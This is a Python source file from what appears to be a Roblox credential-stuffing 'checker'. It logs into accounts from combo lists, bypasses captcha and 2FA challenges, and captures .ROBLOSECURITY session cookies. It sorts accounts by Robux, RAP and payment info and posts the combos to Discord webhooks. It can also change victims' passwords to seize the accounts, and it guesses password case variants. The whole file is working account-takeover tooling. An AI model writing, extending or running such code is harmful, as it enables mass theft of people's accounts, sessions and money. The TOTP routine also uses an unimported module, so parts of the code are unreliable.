# roblox.py - FULL FILE WITH 2FA SUPPORT
import sys, os, string, random, re, queue
from time import sleep
from json import loads, dumps
from base64 import b64encode
from local_solver import get_token
from thread_lock import ThreadLock, lock
from counter import Counter
from combocheck import ComboCheck
from session import Session
from output import Output
from account_info import AccountInfo
from auth_intent import AuthIntent
from ip_intelligence import IpIntelligence
from util import get_config, random_string
from secure import Secure
from discord_webhook import DiscordWebhook, DiscordEmbed

# Import 2FA handler
try:
    from twofa_handler import get_2fa_handler, TwoFAHandler
    HAS_2FA = True
except ImportError:
    HAS_2FA = False
    print("[!] 2FA handler not available")

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

config = get_config()

WEBHOOK_ENABLED = config["logWebhook"]
if WEBHOOK_ENABLED:
    from discord_webhook import DiscordWebhook, DiscordEmbed

WEBHOOKS = config["webhooks"]
WEBHOOK_VARS = {k: v for k, v in WEBHOOKS.items() if v}
WEBHOOK = WEBHOOK_VARS.get("default")
OLD_WEBHOOK = WEBHOOK_VARS.get("old_accounts")
LOCKED_WEBHOOK = WEBHOOK_VARS.get("locked_accounts")
RAP_WEBHOOK = WEBHOOK_VARS.get("rap")
ROBUX_WEBHOOK = WEBHOOK_VARS.get("robux")
RARE_WEBHOOK = WEBHOOK_VARS.get("rare_items")

AUTO_SECURE = config["autoSecure"]["password"]["enabled"]
PREFIX = config["autoSecure"]["password"]["prefix"]
SKIP_INVALID = config["skipCombos"]["skip_invalid"]
SKIP_CHECKED = config["skipCombos"]["skip_checked"]
DEBUG = config.get("debug", False)

# Initialize 2FA handler
twofa_handler = None
if HAS_2FA:
    try:
        twofa_handler = get_2fa_handler(debug=DEBUG)
    except:
        pass

badge_icons = {
    "Administrator": "<:Administrator:1345542368056578079>",
    "Ambassador": "<:Ambassador:1345542370195800147>",
    "Bloxxer": "<:Bloxxer:1345542748777873472>",
    "Bricksmith": "<:Bricksmith:1345542374545166406>",
    "Combat Initiation": "<:CombatInitiation:1345542750837276704>",
    "Friendship": "<:Friendship:1345542378026700982>",
    "Homestead": "<:Homestead:1345542380367122453>",
    "Inviter": "<:Inviter:1345542382313279538>",
    "Official Model Maker": "<:OfficialModelMaker:1345542384473210930>",
    "Veteran": "<:Veteran:1345542385932701749>",
    "Warrior": "<:Warrior:1345542752359677974>",
    "Outrageous Builders Club": "<:OutrageousBuildersClub:1345683662972256256>",
    "Turbo Builders Club": "<:TurboBuildersClub:1345683653719494686>",
    "Welcome To The Club": "<:WelcomeToTheClub:1345683661592334398>"
}

def replace_badge_names(text: str) -> str:
    pattern = re.compile(r'\b(' + '|'.join(re.escape(b) for b in badge_icons) + r')\b')
    return pattern.sub(lambda m: badge_icons[m.group(0)], text)

class Roblox:
    def __init__(self, lock: ThreadLock, counter: Counter, invalid: ComboCheck,
                 checked_file: ComboCheck, locked: ComboCheck, account_queue: queue.Queue):
        self.lock = lock
        self.counter = counter
        self.invalid = invalid
        self.checked_file = checked_file
        self.locked = locked
        self.account_queue = account_queue
        self.session = Session.random_session()
        self.twofa_used = False  # Track if 2FA was used

    def check(self):
        while True:
            try:
                raw = self.account_queue.get(timeout=1)
            except queue.Empty:
                break

            try:
                # Parse account - support format: user:pass or user:pass:2fa_secret
                parts = raw.strip().split(":", 2)
                if len(parts) < 2:
                    continue
                
                self.account = [parts[0], parts[1]]
                self.twofa_secret = parts[2] if len(parts) > 2 else None
                combo = f"{self.account[0]}:{self.account[1]}"

                if SKIP_INVALID and self.invalid.contains(combo): continue
                if SKIP_CHECKED and self.checked_file.contains(combo): continue

                self._perform_login()
            except Exception as e:
                if DEBUG: Output("ERROR").log(f"Thread error: {e}")
            finally:
                self.account_queue.task_done()
                self.counter.increment()

    def _perform_login(self):
        ip = IpIntelligence(self.session)
        self.session.headers.update({
            "Accept-Language": ip.get_accept_language(),
            "Origin": "https://www.roblox.com",
            "Referer": "https://www.roblox.com/login",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36"
        })

        auth = AuthIntent.get_auth_intent(self.session)
        if not auth:
            Output("ERROR").log("Failed to get auth intent")
            return
        self.sai = auth

        test = self.session.post("https://auth.roblox.com/v2/login", json={
            "ctype": "Username", "cvalue": self.account[0], "password": self.account[1]
        })
        self.ctype = "Username" if test.status_code == 200 else "Email"

        payload = {
            "ctype": self.ctype, "cvalue": self.account[0], "password": self.account[1],
            "secureAuthenticationIntent": self.sai
        }

        resp = self.session.post("https://auth.roblox.com/v2/login", json=payload)
        csrf = resp.headers.get("x-csrf-token")
        if csrf:
            self.session.headers["x-csrf-token"] = csrf
            resp = self.session.post("https://auth.roblox.com/v2/login", json=payload)

        data = resp.json()

        if resp.status_code == 200:
            cookie = self.session.cookies.get(".ROBLOSECURITY")
            uid = data.get("user", {}).get("id")
            if cookie and uid:
                self.handle_valid({"userId": uid, "cookie": cookie})
            return

        # Handle captcha challenge
        if "challengeId" in data:
            metadata = data.get("challengeMetadata", "{}")
            token = get_token(self.session, metadata)
            if token:
                self._continue_challenge(data["challengeId"], token)
            return

        # Handle 2FA challenge
        if "twoStepVerification" in data or self._is_2fa_challenge(data):
            self._handle_2fa_challenge(data, payload)
            return

        err = data.get("errors", [{}])[0]
        code = err.get("code", -1)

        if code == 1: self._invalid()
        elif code == 4: self._locked()
        elif code in (6, 7): self._banned(code == 6)
        elif code == 0 and "users" in err.get("fieldData", ""):
            self.handle_multi(err)

    def _is_2fa_challenge(self, data: dict) -> bool:
        """Check if this is a 2FA challenge."""
        errors = data.get("errors", [])
        for err in errors:
            code = err.get("code", -1)
            # Code 17 = 2FA required, Code 23 = 2FA verification needed
            if code in [17, 23, 24]:
                return True
            # Check message for 2FA keywords
            msg = err.get("message", "").lower()
            if "two-step" in msg or "2-step" in msg or "verification code" in msg:
                return True
        return False

    def _handle_2fa_challenge(self, data: dict, original_payload: dict):
        """Handle 2FA verification challenge."""
        if DEBUG:
            Output("2FA").log(f"2FA challenge detected for {self.account[0]}")
        
        # Get 2FA code
        code = None
        
        # First check inline 2FA secret (from accounts.txt format)
        if self.twofa_secret:
            if DEBUG:
                Output("2FA").log(f"Using inline 2FA secret")
            code = self._generate_totp(self.twofa_secret)
        
        # Then check 2FA handler
        elif twofa_handler and twofa_handler.has_2fa(self.account[0]):
            if DEBUG:
                Output("2FA").log(f"Found 2FA config for {self.account[0]}")
            code = twofa_handler.get_totp_code(self.account[0])
            
            # If no TOTP, try backup codes
            if not code:
                code = twofa_handler.get_backup_code(self.account[0])
                if code:
                    self.twofa_used = True
                    if DEBUG:
                        Output("2FA").log(f"Using backup code")
        
        if not code:
            if DEBUG:
                Output("2FA").log(f"No 2FA code available for {self.account[0]}")
            self._needs_2fa()
            return
        
        if DEBUG:
            Output("2FA").log(f"Submitting 2FA code: {code[:2]}****")
        
        # Submit 2FA code
        # Roblox uses different endpoints for 2FA
        try:
            # Method 1: Direct verification
            verify_payload = {
                "ctype": self.ctype,
                "cvalue": self.account[0],
                "password": self.account[1],
                "secureAuthenticationIntent": self.sai,
                "twoFactorCode": code
            }
            
            resp = self.session.post("https://auth.roblox.com/v2/login", json=verify_payload)
            
            # Check for CSRF token
            csrf = resp.headers.get("x-csrf-token")
            if csrf:
                self.session.headers["x-csrf-token"] = csrf
                resp = self.session.post("https://auth.roblox.com/v2/login", json=verify_payload)
            
            data = resp.json()
            
            if resp.status_code == 200:
                cookie = self.session.cookies.get(".ROBLOSECURITY")
                uid = data.get("user", {}).get("id")
                if cookie and uid:
                    self.twofa_used = True
                    self.handle_valid({"userId": uid, "cookie": cookie})
                    return
            
            # Method 2: Challenge-based verification
            if "challengeId" in data:
                challenge_id = data["challengeId"]
                
                # Verify 2FA code
                verify_resp = self.session.post(
                    "https://apis.roblox.com/challenge/v1/continue",
                    json={
                        "challengeId": challenge_id,
                        "challengeType": "twostep",
                        "challengeMetadata": code
                    }
                )
                
                sleep(1)
                
                # Retry login
                resp = self.session.post("https://auth.roblox.com/v2/login", json=verify_payload)
                data = resp.json()
                
                if resp.status_code == 200:
                    cookie = self.session.cookies.get(".ROBLOSECURITY")
                    uid = data.get("user", {}).get("id")
                    if cookie and uid:
                        self.twofa_used = True
                        self.handle_valid({"userId": uid, "cookie": cookie})
                        return
            
            # Check for errors
            err = data.get("errors", [{}])[0]
            code_err = err.get("code", -1)
            
            if code_err in [17, 23, 24]:
                if DEBUG:
                    Output("2FA").log(f"2FA code rejected for {self.account[0]}")
                self._invalid_2fa()
            elif code_err == 1:
                self._invalid()
            elif code_err == 4:
                self._locked()
            else:
                if DEBUG:
                    Output("2FA").log(f"Unknown 2FA error: {err}")
                self._invalid()
                
        except Exception as e:
            if DEBUG:
                Output("2FA").log(f"2FA error: {e}")
            self._invalid()

    def _generate_totp(self, secret: str) -> str:
        """Generate TOTP code from secret."""
        try:
            import hmac
            import hashlib
            import base64
            import struct
            
            # Remove spaces and convert to uppercase
            secret = secret.upper().replace(' ', '')
            
            # Decode base32 secret
            secret_bytes = base64.b32decode(secret, casefold=True)
            
            # Get current time interval (30 second window)
            time_interval = int(time.time() // 30)
            
            # Pack time as big-endian 64-bit integer
            time_bytes = struct.pack('>Q', time_interval)
            
            # Calculate HMAC-SHA1
            hmac_result = hmac.new(secret_bytes, time_bytes, hashlib.sha1).digest()
            
            # Get offset from last nibble
            offset = hmac_result[-1] & 0x0F
            
            # Get 4 bytes starting at offset
            code_bytes = hmac_result[offset:offset + 4]
            
            # Convert to integer (masking sign bit)
            code_int = struct.unpack('>I', code_bytes)[0] & 0x7FFFFFFF
            
            # Get last 6 digits
            code = str(code_int % 1000000).zfill(6)
            
            return code
            
        except Exception as e:
            if DEBUG:
                Output("2FA").log(f"TOTP generation error: {e}")
            return None

    def _continue_challenge(self, cid, token):
        sleep(1)
        self.session.post("https://apis.roblox.com/challenge/v1/continue", json={
            "challengeId": cid, "challengeType": "captcha", "challengeMetadata": token
        })
        self._perform_login()

    def handle_valid(self, user_id_and_cookie):
        acc_info = AccountInfo.get_account_info(self.session, user_id_and_cookie["userId"])
        
        # Build combo with 2FA marker if used
        if self.twofa_used:
            combo = f"{self.account[0]}:{self.account[1]}:{user_id_and_cookie['cookie']} [2FA]"
        else:
            combo = f"{self.account[0]}:{self.account[1]}:{user_id_and_cookie['cookie']}"

        with lock.get_lock():
            open("output/valid_combo.txt", "a", encoding="utf-8").write(combo + "\n")
            
            # Also save to 2FA verified file if 2FA was used
            if self.twofa_used:
                os.makedirs("output/2fa_verified", exist_ok=True)
                open("output/2fa_verified/2fa_verified.txt", "a", encoding="utf-8").write(combo + "\n")

        if AUTO_SECURE:
            new_pass = PREFIX + random_string(10)
            Secure.change_password(self.session, self.account[1], new_pass)

        self._write_outputs(combo, acc_info, False, False)
        if WEBHOOK_ENABLED:
            self._send_webhook(acc_info, user_id_and_cookie["cookie"])

    def _write_outputs(self, combo, acc_info, is_termed, is_banned):
        if is_termed or is_banned: return

        folders = {
            "robux": acc_info["Robux"], "rap": acc_info["RAP"], "balance": acc_info["Balance"],
            "creation_date": f"year{acc_info['Creation Date']}", "pending": acc_info["Pending"],
            "summary": acc_info["Summary"], "items": f"items_{acc_info['Total Items']}",
            "badges": replace_badge_names(acc_info["Badges"])
        }
        for f, v in folders.items():
            os.makedirs(f"output/{f}", exist_ok=True)
            with lock.get_lock():
                open(f"output/{f}/{f}{v}.txt", "a", encoding="utf-8").write(combo + "\n")

        if acc_info["Payment Info"] is True:
            with lock.get_lock():
                open("output/payment_info/payment_info.txt", "a", encoding="utf-8").write(combo + "\n")
        if acc_info["Premium"] is True:
            with lock.get_lock():
                open("output/premium/premium.txt", "a", encoding="utf-8").write(combo + "\n")

        name = self.account[0]
        if 3 <= len(name) <= 4 and name.isalpha():
            with lock.get_lock():
                open(f"output/usernames/{len(name)}chars.txt", "a", encoding="utf-8").write(combo + "\n")

    def _send_webhook(self, acc_info, cookie):
        embed = DiscordEmbed(title="Valid Account" + (" [2FA]" if self.twofa_used else ""), color=0x00FF00)
        embed.add_embed_field(name="Combo", value=f"`{self.account[0]}:{self.account[1]}`", inline=False)
        embed.add_embed_field(name="Robux", value=acc_info["Robux"], inline=True)
        embed.add_embed_field(name="RAP", value=acc_info["RAP"], inline=True)
        embed.add_embed_field(name="Premium", value=str(acc_info["Premium"]), inline=True)
        embed.add_embed_field(name="Payment Info", value=str(acc_info["Payment Info"]), inline=True)
        embed.set_thumbnail(url=acc_info["Thumbnail"])

        url = WEBHOOK
        if int(acc_info["Creation Date"][:4]) < 2010 and OLD_WEBHOOK: url = OLD_WEBHOOK
        elif int(acc_info["RAP"].replace(",", "")) > 500000 and RAP_WEBHOOK: url = RAP_WEBHOOK
        elif acc_info["Rare Items"] and RARE_WEBHOOK: url = RARE_WEBHOOK

        DiscordWebhook(url=url).add_embed(embed).execute()

    def _invalid(self):
        combo = f"{self.account[0]}:{self.account[1]}"
        with lock.get_lock():
            open("output/invalid.txt", "a", encoding="utf-8").write(combo + "\n")
            self.invalid.append(combo + "\n")

    def _locked(self):
        combo = f"{self.account[0]}:{self.account[1]}"
        with lock.get_lock():
            open("output/locked.txt", "a", encoding="utf-8").write(combo + "\n")
            self.locked.append(combo + "\n")

    def _banned(self, term):
        combo = f"{self.account[0]}:{self.account[1]}"
        file = "output/terminated.txt" if term else "output/temp_banned.txt"
        with lock.get_lock():
            open(file, "a", encoding="utf-8").write(combo + "\n")

    def _needs_2fa(self):
        """Handle accounts that need 2FA but no code available."""
        combo = f"{self.account[0]}:{self.account[1]}"
        with lock.get_lock():
            os.makedirs("output/needs_2fa", exist_ok=True)
            open("output/needs_2fa/needs_2fa.txt", "a", encoding="utf-8").write(combo + "\n")

    def _invalid_2fa(self):
        """Handle accounts with invalid 2FA code."""
        combo = f"{self.account[0]}:{self.account[1]}"
        with lock.get_lock():
            os.makedirs("output/invalid_2fa", exist_ok=True)
            open("output/invalid_2fa/invalid_2fa.txt", "a", encoding="utf-8").write(combo + "\n")

    def handle_multi(self, err):
        users = loads(err["fieldData"]).get("users", [])
        for u in users:
            self.account_queue.put(f"{u['name']}:{self.account[1]}\n")
        pwd = self.account[1]
        new_pwd = pwd.lower() if pwd.isupper() else (
            pwd[:1].swapcase() + pwd[1:] if re.search(r"[A-Za-z]", pwd) else pwd
        )
        self.account_queue.put(f"{self.account[0]}:{new_pwd}\n")